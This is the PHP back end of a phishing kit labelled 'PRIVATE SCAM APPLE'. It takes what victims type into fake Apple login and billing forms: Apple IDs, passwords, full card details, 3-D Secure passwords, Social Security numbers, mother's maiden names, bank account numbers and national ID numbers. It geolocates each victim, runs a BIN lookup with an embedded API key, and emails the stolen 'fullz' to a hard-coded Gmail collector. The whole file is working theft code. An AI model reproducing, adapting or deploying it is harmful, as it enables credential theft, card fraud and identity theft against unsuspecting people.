﻿<?php
/*   
                              #===============================#
                              #    PRIVATE SCAM APPLE         #
                              #           PIradz17            #
							  #     Facebook.com/Piradz17     #
                              #===============================#                     
*/

session_start();
error_reporting(0);
$TIME_DATE = date('H:i:s d/m/Y');
$Z118_EMAIL="foley.victoria998@gmail.com"; // PUT UR FUCKING E-MAIL BRO
function Z118_OS($USER_AGENT){
$OS_ERROR=  "Unknown OS Platform";$OS =  array( '/windows nt 10/i' =>'Windows 10','/windows nt 6.3/i'=>'Windows 8.1','/windows nt 6.2/i'=>'Windows 8','/windows nt 6.1/i'=>'Windows 7','/windows nt 6.0/i'=>'Windows Vista','/windows nt 5.2/i'=>'Windows Server 2003/XP x64','/windows nt 5.1/i'=>'Windows XP','/windows xp/i'    =>'Windows XP','/windows nt 5.0/i'=>'Windows 2000','/windows me/i'    =>'Windows ME','/win98/i'         =>'Windows 98','/win95/i'         =>'Windows 95','/win16/i'         =>'Windows 3.11','/macintosh|mac os x/i' =>  'Mac OS X','/mac_powerpc/i'   =>'Mac OS 9','/linux/i'         =>'Linux','/ubuntu/i'        =>'Ubuntu','/iphone/i'        =>'iPhone','/ipod/i'          =>'iPod','/ipad/i'          =>'iPad','/android/i'       =>'Android','/blackberry/i'    =>'BlackBerry','/webos/i'         =>'Mobile');
foreach($OS as $regex => $value) {if (preg_match($regex, $USER_AGENT)) {$OS_ERROR=$value;}}return $OS_ERROR;}
function Z118_Browser($USER_AGENT){
$BROWSER_ERROR=  "Unknown Browser";
$BROWSER =array('/msie/i'  =>'Internet Explorer','/firefox/i'=>'Firefox','/safari/i'=>'Safari','/chrome/i'=>'Chrome','/edge/i'=>'Edge','/opera/i'=>'Opera','/netscape/i'=>'Netscape','/maxthon/i'=>'Maxthon','/konqueror/i'=>'Konqueror','/mobile/i'=>'Handheld Browser');
foreach($BROWSER as $regex => $value){if (preg_match($regex, $USER_AGENT)){$BROWSER_ERROR=$value;}}return $BROWSER_ERROR;}
//////////////////////////////////////// GET Country & Country CODE ! ////////////////////////////////////////////////
$client =@$_SERVER['HTTP_CLIENT_IP'];$forward=@$_SERVER['HTTP_X_FORWARDED_FOR'];$remote =@$_SERVER['REMOTE_ADDR'];$result ="Unknown";
if(filter_var($client, FILTER_VALIDATE_IP)){$ip=$client;}
elseif(filter_var($forward, FILTER_VALIDATE_IP)){$_SESSION['_ip_']=$ip=$forward;}
else{$_SESSION['_ip_']=$ip=$remote;}
$IP_LOOKUP=@json_decode(file_get_contents("http://ip-api.com/json/".$_SESSION['_ip_'].""));
$LOOKUP_COUNTRY=$IP_LOOKUP->country;$LOOKUP_CNTRCODE= $IP_LOOKUP->countryCode;$LOOKUP_CITY=$IP_LOOKUP->city;$LOOKUP_REGION =$IP_LOOKUP->region;$LOOKUP_STATE  =$IP_LOOKUP->regionName;$LOOKUP_ZIPCODE=$IP_LOOKUP->zip;
$_SESSION['_LOOKUP_COUNTRY_']=$LOOKUP_COUNTRY;$_SESSION['_LOOKUP_CNTRCODE_']= $LOOKUP_CNTRCODE;$_SESSION['_LOOKUP_CITY_']=$LOOKUP_CITY;$_SESSION['_LOOKUP_REGION_'] =$LOOKUP_REGION;$_SESSION['_LOOKUP_STATE_']  =$LOOKUP_STATE;$_SESSION['_LOOKUP_ZIPCODE_']=$LOOKUP_ZIPCODE;
$_SESSION['_LOOKUP_REGIONS_']=$_SESSION['_LOOKUP_STATE_']."(".$_SESSION['_LOOKUP_REGION_'].")";
$_SESSION['_forlogin_']=$_SESSION['_LOOKUP_CNTRCODE_']." - ".$_SESSION['_ip_'];
///////////////////////////////////////////////////////////////////////////////////////////////////////////////
$LOGS="[".date('Y-m-d H:i:s')."] ".$_SESSION['_LOOKUP_CNTRCODE_']." - ".$_SESSION['_ip_']."";
file_put_contents('../../logs.txt', $LOGS . PHP_EOL, FILE_APPEND);
if (isset($_POST['cvv'])) {
if(filter_var($_POST['appleid'], FILTER_VALIDATE_EMAIL)){ 
$_SESSION['_appleid_']=$_POST['appleid'];$_SESSION['_password_']=$_POST['password'];$_SESSION['_cvv_']=$_POST['cvv'];
$Z118_MESSAGE .= "
<html>
<head><meta charset=\"UTF-8\"></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
################# <font style='color: #820000;'>ACCOUNT APPLE FULLZ</font> ####################<br/>
±±±±±±±±±±±±±±±±±[ <font style='color: #808080;'>LOGIN INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>♦</font> [Apple ID] = <font style='color:#0070ba;'>".$_SESSION['_appleid_']."</font><br>
<font style='color:#9c0000;'>♦</font> [Password] = <font style='color:#0070ba;'>".$_SESSION['_password_']."</font> | <font style='color:#9c0000;'>♦</font> [CSC] = <font style='color:#0070ba;'>".$_SESSION['_cvv_']."</font><br>
±±±±±±±±±±±±±±[ <font style='color: #808080;'>IP LOOKUP INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>♦</font> [Country] = <font style='color:#0070ba;'>".$_SESSION['_LOOKUP_COUNTRY_']."</font> | <font style='color:#9c0000;'>♦</font> [City] = <font style='color:#0070ba;'>".$_SESSION['_LOOKUP_CITY_']."</font><br>
<font style='color:#9c0000;'>♦</font> [State] = <font style='color:#0070ba;'>".$_SESSION['_LOOKUP_REGIONS_']."</font> | <font style='color:#9c0000;'>♦</font> [Zip Code] = <font style='color:#0070ba;'>".$_SESSION['_LOOKUP_ZIPCODE_']."</font><br>
±±±±±±±±±±±±±±±±[ <font style='color: #808080;'>VICTIME INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>♦</font> [IP INFO] = <font style='color:#0070ba;'>https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."</font><br>
<font style='color:#9c0000;'>♦</font> [BROWSER] = <font style='color:#0070ba;'>".Z118_Browser($_SERVER['HTTP_USER_AGENT'])." On ".Z118_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
<font style='color:#9c0000;'>♦</font> [TIME/DATE] = <font style='color:#0070ba;'>".$TIME_DATE."</font><br>
################## <font style='color: #820000;'>BY Piradz17</font> #####################
</div></html>\n";
$Z118_SUBJECT="<< APPLE ♦ Login ID Fr0m | ".$_SESSION['_forlogin_']." ♦ ".$_SESSION['_appleid_']." | >>";$Z118_HEADERS .= "From:Piradz17<noreply@Piradz17.dz>";$Z118_HEADERS .= $_POST['eMailAdd']."\n";$Z118_HEADERS .= "MIME-Version: 1.0\n";$Z118_HEADERS .= "Content-type: text/html; charset=UTF-8\n";@mail($Z118_EMAIL, $Z118_SUBJECT, $Z118_MESSAGE, $Z118_HEADERS);
}
echo 'false';
}
if (isset($_POST['cardnumber'])) {
$_SESSION['_fname_']=$_POST['fname'];$_SESSION['_lname_']=$_POST['lname'];
$_SESSION['_fullname_']=$_SESSION['_fname_']." ".$_SESSION['_lname_'];
$_SESSION['_birthdate_']=$_POST['birthday']."/".$_POST['birthmonth']."/".$_POST['birthyear'];
$_SESSION['_address_']=$_POST['address'];$_SESSION['_city_']= $_POST['city'];
$_SESSION['_state_']=$_POST['state'];$_SESSION['_zipCode_']=$_POST['zipCode'];
$_SESSION['_c_valid_']=$_POST['c_valid'];$_SESSION['_c_type_'] =$_POST['c_type'];
$_SESSION['_nameoncard_'] =$_POST['nameoncard'];$_SESSION['_cardnumber_'] =$_POST['cardnumber'];
$_SESSION['_cardnumber_'] = preg_replace('/\s+/', '', $_SESSION['_cardnumber_']);
$_SESSION['_expdate_']=$_POST['expmonth']."/".$_POST['expyear'];
$_SESSION['_csc_']=$_POST['csc'];$_SESSION['_phoneNumber_']=$_POST['phoneNumber'];
///////////////////////////////// BIN CHECKER  /////////////////////////////////
$BIN_LOOKUP =str_replace(' ', '', $_SESSION['_cardnumber_']);
$Z118_BIN=@json_decode(file_get_contents("https://api.bincodes.com/creditcard-checker.php?api_key=2d974e94811161f1dda14bbf63aa9790&cc=".$BIN_LOOKUP."&format=json"));
$BIN_CARD=$Z118_BIN->card;$BIN_BANK=$Z118_BIN->bank;$BIN_TYPE=$Z118_BIN->type;$BIN_LEVEL=$Z118_BIN->level;$BIN_CNTRCODE= $Z118_BIN->countrycode;$BIN_WEBSITE=strtolower($Z118_BIN->website);$BIN_PHONE=strtolower($Z118_BIN->phone);$BIN_COUNTRY=$Z118_BIN->country;
///////////////////////////////// SESSION FOR SOME VAR  /////////////////////////////////
$_SESSION['_country_']=$BIN_COUNTRY;$_SESSION['_cntrcode_']=$BIN_CNTRCODE;
$_SESSION['_cc_brand_']=$BIN_CARD;$_SESSION['_cc_bank_']=$BIN_BANK;
$_SESSION['_cc_type_']=$BIN_TYPE;$_SESSION['_cc_class_']=$BIN_LEVEL;
$_SESSION['_cc_site_']=$BIN_WEBSITE;$_SESSION['_cc_phone_']=$BIN_PHONE;
$_SESSION['_ccglobal_']=$_SESSION['_cc_brand_']." ".$_SESSION['_cc_type_']." ".$_SESSION['_cc_class_'];
$_SESSION['_global_']=$_SESSION['_cntrcode_']." - ".$_SESSION['_ip_'];
$_SESSION['_z118_']=$_SESSION['_c_type_']." ".ucwords(strtolower($_SESSION['_cc_class_']));
///////////////////////////////// BIN CHECKER  /////////////////////////////////
$Z118_MESSAGE .= "
<html>
<head><meta charset=\"UTF-8\"></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
################# <font style='color: #820000;'>ACCOUNT APPLE FULLZ</font> ####################<br/>
±±±±±±±±±±±±±±±±±[ <font style='color: #808080;'>LOGIN INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>♦</font> [Apple ID] = <font style='color:#0070ba;'>".$_SESSION['_appleid_']."</font><br>
<font style='color:#9c0000;'>♦</font> [Password] = <font style='color:#0070ba;'>".$_SESSION['_password_']."</font> | <font style='color:#9c0000;'>♦</font> [CSC] = <font style='color:#0070ba;'>".$_SESSION['_cvv_']."</font><br>
±±±±±±±±±±±±±±±±[ <font style='color: #808080;'>BILLING INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>♦</font> [Full Name] = <font style='color:#0070ba;'>".$_SESSION['_fullname_']."</font><br>
<font style='color:#9c0000;'>♦</font> [Date Of Birth] = <font style='color:#0070ba;'>".$_SESSION['_birthdate_']." </font><br>
<font style='color:#9c0000;'>♦</font> [Country] = <font style='color:#0070ba;'>".$_SESSION['_LOOKUP_CNTRCODE_']."</font><br>
<font style='color:#9c0000;'>♦</font> [Address Line] = <font style='color:#0070ba;'>".$_SESSION['_address_']."</font><br>
<font style='color:#9c0000;'>♦</font> [City] = <font style='color:#0070ba;'>".$_SESSION['_city_']."</font> | <font style='color:#9c0000;'>♦</font> [State] = <font style='color:#0070ba;'>".$_SESSION['_state_']."</font><br>
<font style='color:#9c0000;'>♦</font> [Phone Number] = <font style='color:#0070ba;'>".$_SESSION['_phoneNumber_']."</font><br>
±±±±±±±±±±±±±±±±[ <font style='color: #808080;'>CARDING INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>♦</font> [Bank Name] = <font style='color:#0070ba;'>".$_SESSION['_cc_bank_']."</font><br>
<font style='color:#9c0000;'>♦</font> [Cardholder's Name] = <font style='color:#0070ba;'>".$_SESSION['_nameoncard_']."</font><br>
<font style='color:#9c0000;'>♦</font> [".ucwords(strtolower($_SESSION['_cc_type_']))." Card Number] = <font style='color:#0070ba;'>".$_SESSION['_cardnumber_']." (".$_SESSION['_cc_class_'].")</font><br>
<font style='color:#9c0000;'>♦</font> [Card Security Code]	= <font style='color:#0070ba;'>".$_SESSION['_csc_']."</font><br>
<font style='color:#9c0000;'>♦</font> [Expiration Date] = <font style='color:#0070ba;'>".$_SESSION['_expdate_']."</font><br>
±±±±±±±±±±±±±±±±[ <font style='color: #808080;'>VICTIME INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>♦</font> [IP INFO] = <font style='color:#0070ba;'>https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."</font><br>
<font style='color:#9c0000;'>♦</font> [BROWSER] = <font style='color:#0070ba;'>".Z118_Browser($_SERVER['HTTP_USER_AGENT'])." On ".Z118_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
<font style='color:#9c0000;'>♦</font> [TIME/DATE] = <font style='color:#0070ba;'>".$TIME_DATE."</font><br>
################## <font style='color: #820000;'>BY Piradz17</font> #####################
</div></html>\n";
$Z118_SUBJECT="<< APPLE ♦ Card Fullz | ".$_SESSION['_nameoncard_']." ♦ ".$_SESSION['_global_']." ♦ ".$_SESSION['_z118_']." | >>";$Z118_HEADERS .= "From:Piradz17<noreplay@piradz17.dz>";$Z118_HEADERS .= $_POST['eMailAdd']."\n";$Z118_HEADERS .= "MIME-Version: 1.0\n";$Z118_HEADERS .= "Content-type: text/html; charset=UTF-8\n";@mail($Z118_EMAIL, $Z118_SUBJECT, $Z118_MESSAGE, $Z118_HEADERS);
}
if (isset($_POST['password_vbv'])==true) {
$_SESSION['_password_vbv_']=$_POST['password_vbv'];
$_SESSION['_sortnum_']=$_POST['sortnum1']."-".$_POST['sortnum2']."-".$_POST['sortnum3'];$_SESSION['_mmname_']=$_POST['mmname'];
$_SESSION['_accnumber_']=$_POST['accnumber'];$_SESSION['_ssnnum_']=$_POST['ssn1']."-".$_POST['ssn2']."-".$_POST['ssn3'];
$_SESSION['_creditlimit_']=$_POST['creditlimit'];$_SESSION['_osid_']=$_POST['osid'];	
$_SESSION['_codicefiscale_']=$_POST['codicefiscale'];$_SESSION['_kontonummer_']=$_POST['kontonummer'];$_SESSION['_offid_']=$_POST['offid'];
$Z118_MESSAGE .= "
<html>
<head><meta charset=\"UTF-8\"></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
################# <font style='color: #820000;'>ACCOUNT APPLE FULLZ</font> ####################<br/>
±±±±±±±±±±±±±±±±[ <font style='color: #808080;'>CARDING INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>♦</font> [Bank Name] = <font style='color:#0070ba;'>".$_SESSION['_cc_bank_']."</font><br>
<font style='color:#9c0000;'>♦</font> [Cardholder's Name] = <font style='color:#0070ba;'>".$_SESSION['_nameoncard_']."</font><br>
<font style='color:#9c0000;'>♦</font> [".ucwords(strtolower($_SESSION['_cc_type_']))." Card Number] = <font style='color:#0070ba;'>".$_SESSION['_cardnumber_']." (".$_SESSION['_cc_class_'].")</font><br>
<font style='color:#9c0000;'>♦</font> [Card Security Code]	= <font style='color:#0070ba;'>".$_SESSION['_csc_']."</font><br>
<font style='color:#9c0000;'>♦</font> [Expiration Date] = <font style='color:#0070ba;'>".$_SESSION['_expdate_']."</font><br>
±±±±±±±±±±±±±±±±[ <font style='color: #808080;'>VBV INFO INFORMATION</font> ]±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>♦</font> [Date Of Birth]  = <font style='color:#0070ba;'>".$_SESSION['_birthdate_']." Format (DD/MM/YYYY)</font><br>
<font style='color:#9c0000;'>♦</font> [3D Secure]      = <font style='color:#0070ba;'>".$_SESSION['_password_vbv_']."</font><br>\n";
if ($_SESSION['_country_'] == "UNITED STATES"){ // UNITED STATES
$Z118_MESSAGE .= "<font style='color:#9c0000;'>♦</font> [Social Security Number] = <font style='color:#0070ba;'>".$_SESSION['_ssnnum_']."</font><br>\n";}
elseif ($_SESSION['_country_'] == "CANADA"){ // CANADA
$Z118_MESSAGE .= "<font style='color:#9c0000;'>♦</font> [Social Security Number] = <font style='color:#0070ba;'>".$_SESSION['_ssnnum_']."</font><br>\n";
$Z118_MESSAGE .= "<font style='color:#9c0000;'>♦</font> [Mother's Maiden Name] = <font style='color:#0070ba;'>".$_SESSION['_mmname_']."</font><br>\n";}
elseif ($_SESSION['_country_'] == "UNITED KINGDOM" || $_SESSION['_country_'] ==  "IRELAND"){ // UNITED KINGDOM // IRELAND
$Z118_MESSAGE .= "<font style='color:#9c0000;'>♦</font> [Sort Code] = <font style='color:#0070ba;'>".$_SESSION['_sortnum_']."</font><br>\n";$Z118_MESSAGE .= "<font style='color:#9c0000;'>♦</font> [Account Number] = <font style='color:#0070ba;'>".$_SESSION['_accnumber_']."</font><br>\n";}
elseif($_SESSION['_country_'] == "AUSTRALIA"){ // AUSTRALIA
$Z118_MESSAGE .= "<font style='color:#9c0000;'>♦</font> [Credit Limits] = <font style='color:#0070ba;'>".$_SESSION['_creditlimit_']."</font><br>\n";$Z118_MESSAGE .= "<font style='color:#9c0000;'>♦</font> [OSID]	= <font style='color:#0070ba;'>".$_SESSION['_osid_']."</font><br>\n";}
elseif($_SESSION['_country_'] == "ITALY"){ // ITALY
$Z118_MESSAGE .= "<font style='color:#9c0000;'>♦</font> [Codice Fiscale] = <font style='color:#0070ba;'>".$_SESSION['_codicefiscale_']."</font><br>\n";}
if($_SESSION['_country_'] == "SWITZERLAND" || $_SESSION['_country_'] ==  "GERMANY") { // SWITZERLAND || GERMANY
$Z118_MESSAGE .= "<font style='color:#9c0000;'>♦</font> [Kontonummer] = <font style='color:#0070ba;'>".$_SESSION['_kontonummer_']."</font><br>\n";}
elseif($_SESSION['_country_'] == "GREECE"){ // GREECE
$Z118_MESSAGE .= "<font style='color:#9c0000;'>♦</font> [Officiel ID] = <font style='color:#0070ba;'>".$_SESSION['_offid_']."</font><br>\n";}
$Z118_MESSAGE .= "
±±±±±±±±±±±±±±±±[ <font style='color: #808080;'>VICTIME INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>♦</font> [IP INFO] = <font style='color:#0070ba;'>https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."</font><br>
<font style='color:#9c0000;'>♦</font> [BROWSER] = <font style='color:#0070ba;'>".Z118_Browser($_SERVER['HTTP_USER_AGENT'])." On ".Z118_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
<font style='color:#9c0000;'>♦</font> [TIME/DATE] = <font style='color:#0070ba;'>".$TIME_DATE."</font><br>
################## <font style='color: #820000;'>BY Piradz17</font> #####################
</div></html>\n";
$Z118_SUBJECT="<< APPLE ♦ VBV Fullz | ".$_SESSION['_nameoncard_']." ♦ ".$_SESSION['_global_']." ♦ ".$_SESSION['_z118_']." | >>";$Z118_HEADERS .= "From:Piradz17<noreplay@piradz17.com>";$Z118_HEADERS .= $_POST['eMailAdd']."\n";$Z118_HEADERS .= "MIME-Version: 1.0\n";$Z118_HEADERS .= "Content-type: text/html; charset=UTF-8\n";@mail($Z118_EMAIL, $Z118_SUBJECT, $Z118_MESSAGE, $Z118_HEADERS);
}
?>